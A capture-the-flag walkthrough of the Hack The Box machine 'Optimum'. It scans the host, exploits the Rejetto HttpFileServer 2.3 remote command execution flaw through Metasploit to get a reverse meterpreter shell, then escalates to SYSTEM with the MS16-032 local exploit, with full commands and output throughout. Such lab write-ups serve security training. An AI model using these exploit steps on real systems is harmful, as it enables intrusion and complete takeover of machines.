### Optimim HTB

### Difficulty: Easy

### IP Address = 10.10.10.8

Nmap Scan:

```
┌──(mark㉿haxor)-[~/…/B2B/HTB/Beep/Optimum]
└─$ nmap -sCV -A 10.10.10.8 -p80 -oN nmapscan       
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-20 04:25 WAT
Nmap scan report for 10.10.10.8
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds
```

From the scan we have only one port open and a service running on it

Searching for exploit leads to this 

![image](https://user-images.githubusercontent.com/113513376/213611676-cb70f360-4ea9-4386-adf3-796829171506.png)

Now lets actually check if it's really Rejetto HTTP File Server that's running on port 80

![image](https://user-images.githubusercontent.com/113513376/213611790-22466a65-001b-4c0d-88e3-4e0eb6d7383d.png)

So i'll try the exploit now

```
                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/HTB/Beep/Optimum]
└─$ python2 exploit.py                                   
[.]Something went wrong..!
        Usage is :[.] python exploit.py <Target IP address>  <Target Port Number>
        Don't forgot to change the Local IP address and Port number on the script

```

So i edited the ip address to my tun0 ip
![image](https://user-images.githubusercontent.com/113513376/213611963-57417065-a023-430f-afdd-7e8904308459.png)

On running the exploit it didn't work 

```
┌──(mark㉿haxor)-[~/…/B2B/HTB/Beep/Optimum]
└─$ python2 exploit.py 10.10.10.8 80
                                                                                                        

``` 
```                                                                                                        
┌──(mark㉿haxor)-[~/…/B2B/HTB/Beep/Optimum]
└─$ nc -lvnp 4444         
listening on [any] 4444 ...

```

So i decided to use metasploit

```
┌──(mark㉿haxor)-[~/…/B2B/HTB/Beep/Optimum]
└─$ msfconsole              
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2229 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see 
msfconsole --help to learn more

[*] Starting persistent handler(s)...
msf6 > 
```

Search for the exploit

```
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec                                                                                                 

msf6 > 
```

Use it and run against the remote server

```
sf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Us
                                         ing-Metasploit
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on t
                                         he local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
rhosts => 10.10.10.8
msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost tun0
lhost => tun0
msf6 exploit(windows/http/rejetto_hfs_exec) > set srvport 8081
srvport => 8081
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[*] Using URL: http://10.10.16.7:8081/Cs7x0R8
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Cs7x0R8
[*] Sending stage (175686 bytes) to 10.10.10.8
```

It hangs for some time  

But on checking the active sessions

```
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions

Active sessions
===============

  Id  Name  Type                     Information               Connection
  --  ----  ----                     -----------               ----------
  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.16.7:4444 -> 10.10.10.8:49170 (10.10.10.8)
```

Now it worked

Lets switch to it then

```
msf6 exploit(windows/http/rejetto_hfs_exec) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: OPTIMUM\kostas
meterpreter > 
```

Now lets escalate privilege

Using metasploit vulnerability suggester module

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(windows/http/rejetto_hfs_exec) > use 0
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 167 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.8 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.                                                                                                         
 2   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.                                                                                          
```

Now lets try the second exploit

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options

Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.220.131  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost tun0
lhost => tun0
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 10.10.16.7:4444 
[+] Compressed size: 1160
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\ydKUiqlwYoamw.ps1...
[*] Compressing script contents...
[+] Compressed size: 3727
[*] Executing exploit script...
         __ __ ___ ___   ___     ___ ___ ___ 
        |  V  |  _|_  | |  _|___|   |_  |_  |
        |     |_  |_| |_| . |___| | |_  |  _|
        |_|_|_|___|_____|___|   |___|___|___|
                                            
                       [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2484

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race

[!] Holy handle leak Batman, we have a SYSTEM shell!!

Vr51bjK0ewD0Ps1LzvexyMrksXIkogUC
[+] Executed on target machine.
[*] Sending stage (175686 bytes) to 10.10.10.8
[*] Meterpreter session 3 opened (10.10.16.7:4444 -> 10.10.10.8:49176) at 2023-01-20 04:57:55 +0100
[+] Deleted C:\Users\kostas\AppData\Local\Temp\ydKUiqlwYoamw.ps1

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
 
 And we're done xD
 
 <br> <br>
[Back To Home](../../index.md)
<br>
